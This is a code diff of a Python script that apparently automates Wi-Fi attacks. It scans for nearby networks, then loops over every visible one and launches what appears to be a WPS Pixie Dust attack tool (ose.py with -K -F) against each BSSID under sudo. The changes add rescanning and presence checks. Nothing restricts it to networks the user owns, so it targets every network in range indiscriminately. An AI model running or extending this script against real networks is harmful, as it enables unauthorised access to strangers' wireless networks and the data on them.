@@ -4,16 +4,19 @@ import nmcli
 import os
 import subprocess
 import time
-import signal
-import sys
 
 
 INTERFACE = os.getenv("INTERFACE")
-TIMEOUT = 60
+TIMEOUT = 30
+
+PATH = os.getenv("absolute_path")
 
 def scan(interface: str, rescan: bool=True):
-    nmcli.device.wifi_rescan(ifname=interface)
-    return nmcli.device.wifi(ifname=interface, rescan=rescan)
+    print("Scanning...")
+    while nmcli.device.wifi(ifname=interface) == []:
+        nmcli.device.wifi_rescan(ifname=interface)
+    print("Scan complete\n")
+    return nmcli.device.wifi(ifname=interface)
 
 
 def main_loop():
@@ -21,10 +24,12 @@ def main_loop():
         print("The outputs will be saved in the start script directory (ultimatetrollium/reports)")
         time.sleep(3)
 
-        networks = scan(INTERFACE, True)
+        networks_old = scan(INTERFACE, True)
+        networks_new = networks_old # eliminates an error on the first loop
+        last_scan = time.time()
 
         print("Networks found:\n")
-        for network in networks:
+        for network in networks_old:
             print("--------")
             if network.ssid != "":
                 print(f"{network.ssid}")
@@ -32,7 +37,7 @@ def main_loop():
                 print("(no name)")
             print(f"{network.bssid}\n")
 
-        for network in networks:
+        for network in networks_old:
             if network.ssid != "":
                 ssid = network.ssid
             else:
@@ -40,13 +45,34 @@ def main_loop():
 
             print(f"Target: {ssid}, {network.bssid}\n")
 
+            if abs(time.time() - last_scan) > 10:
+                networks_new = scan(INTERFACE, True)
+                last_scan = time.time()
+
+            if ssid == "(no name)":
+                print("Hidden network, skipping...\n")
+                continue
+
+            # check if the network is still there
+            network_present = False
+            for n in networks_new:
+                if network.bssid == n.bssid:
+                    network_present = True
+                    break
+
+            if network_present == False:
+                print("Network not found, skipping...\n")
+                continue
+            else:
+                print("Network present\n")
+            
             # The interface should always restart before running the attack
             subprocess.run(f"sudo ifconfig {INTERFACE} down", shell=True)
             subprocess.run(f"sudo iwconfig {INTERFACE} mode managed", shell=True)
             subprocess.run(f"sudo ifconfig {INTERFACE} up", shell=True)
 
-            subprocess.run(f"timeout {TIMEOUT} sudo ../ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)
+            subprocess.run(f"timeout {TIMEOUT} sudo {PATH}/.scripts/ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)
 
-        
+
 if __name__ == "__main__":
     main_loop()
